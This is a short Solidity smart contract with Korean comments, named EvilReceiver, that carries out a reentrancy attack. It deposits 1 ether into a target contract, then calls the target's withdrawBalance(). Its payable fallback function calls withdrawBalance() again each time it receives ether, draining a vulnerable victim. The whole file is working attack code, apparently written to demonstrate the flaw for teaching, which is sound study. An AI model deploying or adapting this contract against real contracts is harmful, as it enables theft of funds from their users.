pragma solidity^0.4.11;

contract EvilReceiver{
    address public target; //공격 대상 계약의 addr
    event MessageLog(string);
    event BalanceLog(uint);

    function EvilReceiver(address _target) {
        target = _target;
    }
    
    //fallback 함수
    function() payable{
        BalanceLog(this.balance);

        //VictimBalance를 호출 
        if(!msg.sender.call.value(0)(bytes4(sha3("withdrawBalance()")))){
            MessageLog("FAIL");
        } else {
            MessageLog("SUCCESS");
        }
    }

    //EOA로부터 송금받을 때 사용하는 함수
    function addBalance() public payable {
        
    }

    //공격 대상으로 송금
    function sendToTarget() public {
        if(!target.call.value(1 ether)(bytes4(sha3("addBalance()")))){
            throw;
        }
    }

    //공격 대상에게 인출할 때 사용하는 함수 
    function withdraw() public {
        if(!target.call.value(0)(bytes4(sha3("withdrawBalance()")))){
            throw;
        }
    }
}